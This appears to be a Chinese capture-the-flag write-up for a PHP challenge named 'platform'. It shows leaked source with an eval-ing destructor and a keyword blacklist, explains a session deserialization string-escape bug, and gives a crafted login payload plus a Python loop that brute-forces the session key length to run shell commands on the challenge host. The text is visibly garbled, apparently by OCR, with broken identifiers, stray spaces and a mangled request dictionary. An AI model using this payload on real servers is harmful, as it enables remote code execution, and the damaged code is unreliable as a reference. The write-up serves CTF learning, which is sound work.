---
tags: [PHP反序列化, 源码审计, Session文件利用, Eval利用, RCE]
---

# platform

www.zip源码泄漏

index.php

```
<?php
session_start() ;
require   'user .php ' ;
require   'class .php ' ;

$sessionManager  =  new  SessionManager() ;
$SessionRandom  =  new  SessionRandom() ;

if  ($_SERVER[ 'REQUEST_METHOD ' ]  =   'POST ')  {
$username  =  $_POST [ 'username ' ] ;
$password  =  $_POST [ 'password ' ] ;

$_SESSION [ 'user ' ]  =  $username ;

if  ( !isset($_SESSION [ 'session_key ' ]))  {
$_SESSION[ 'session_key ' ]  =  $SessionRandom→ generateRandomString(); }

$_SESSION [ 'password ' ]  =  $password ;
$result  =  $sessionManager→filterSensitiveFunctions();
header( ' Location :  dashboard .php ') ;
exit() ; }  else  {
require   'login .php ' ;
}
```

class.php

```
<?php
class  notouchitsclass
{
public  $data;

public  function  一construct($data)
{

$this→ data  =  $data; }
public  function  一destruct()
{
echo  $this→ data;
eval($this→ data) ; }
}

class  SessionRandom
{

public  function  generateRandomString()
{
Ⅱ  $length  =  rand(1 ,  50) ;
$length  =  22;

$characters  =
'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ' ;
$charactersLength  =  strlen($characters) ;
$randomString  =   ' ' ;

for  ($i  =  0 ;  $i  <  $length;  $i艹 )  {
$randomString  .=  $characters [rand(0 ,  $charactersLength  -  1 )] ; }

return  $randomString ; }
}

class  SessionManager
{
private  $sessionPath;
private  $sessionId ;
private  $sensitiveFunctions  =  [ 'system ' ,  'eval ' ,   'exec ' ,   'passthru ' , 'shell_exec ' ,   'popen ' ,   'proc_open ' ] ;

public  function  一construct()
{
if  (session_status()  =  PHP_SESSION_NONE)  {
throw  new  Exception("Session  has  not  been  started .  Please  start  a session  before  using  this  class . ") ;
}
$this→ sessionPath  =  session_save_path();
$this→ sessionId  =  session_id(); }


private  function  getSessionFilePath()
{
return  $this→ sessionPath  .  "/sess_ "  .  $this→ sessionId;
}

public  function  filterSensitiveFunctions()
{
$sessionFile  =  $this→ getSessionFilePath();

if  (file_exists($sessionFile))  {
$sessionData  =  file_get_contents($sessionFile) ;

foreach  ($this→ sensitiveFunctions  as  $function)  {
if  (strpos($sessionData ,  $function)  丰  false)  {
$sessionData  =  str_replace($function ,  ' ' ,  $sessionData) ;
}
}
echo  $sessionData ;

file_put_contents($sessionFile ,  $sessionData) ;

return  "Sensitive  functions  have  been  filtered  from  the  session
file . " ;
}  else  {
return  "Session  file  not  found . " ;
}
}
}
```

index.php 登录的时候调用了 filterSensitiveFunctions, 存在 PHP session 反序列化字符串逃逸, 利用该漏洞可以控制 session 的内容, 例如

```
username  =   'systemsystemsystemsystemsystemsystemsystemsystemsystemsystem '
password  =  ' ' ' " ;user |O :15 : "notouchitsclass " :1 :
{s:4: "data " ;s:31: "evevalal('sysystemstem($_POST ["cmd"]) ; ') ; " ;}a |s :1 : "1 ' ' '
```

可以修改  $_SESSION[ 'user ' ]  的内容, 这样 dashboard.php 在获取  $_SESSION[ 'user ' ]  的时候就会反序列化 notouchitsclass 对象实现 RCE

函数黑名单过滤利用双写就能绕过

最后 generateRandomString 生成的是 1-50 范围的随机数, 可以把 payload 固定然后爆破一下,有 1/50 的概率能 RCE



exp

```
import  requests

url  =   'http:Ⅱeci-2zeg9nmyrzhwgjmrmpb4.cloudeci1.ichunqiu.com'
#  url  =   'http:Ⅱ127.0.0.1 :8000'

username  =   'systemsystemsystemsystemsystemsystemsystemsystemsystemsystem ' password  =  ' ' ' " ;user |O :15 : "notouchitsclass " :1 :
{s:4: "data " ;s:31: "evevalal('sysystemstem($_POST ["cmd"]) ; ') ; " ;}a |s :1 : "1 ' ' '

data  =  {
'
,
'password ' :  password }
cookies  =  {
'PHPSESSID ' :   '7vsehv1eol3d3gu7nkp1chsfpf ' }

while  True :
print('requesting ')
_  =  requests .post(url  +   '/index .php ' ,  data=data ,  cookies=cookies , allow_redirects=False)
_  =  requests .post(url  +   '/index .php ' ,  data=data ,  cookies=cookies , allow_redirects=False)
r  =  requests .post(url  +  '/dashboard .php ' ,  data={ 'cmd ' :   'id;env;ls / ;/readflag '} ,  cookies=cookies)
if  'uid '  in  r .text :
print(r .text)
break

```

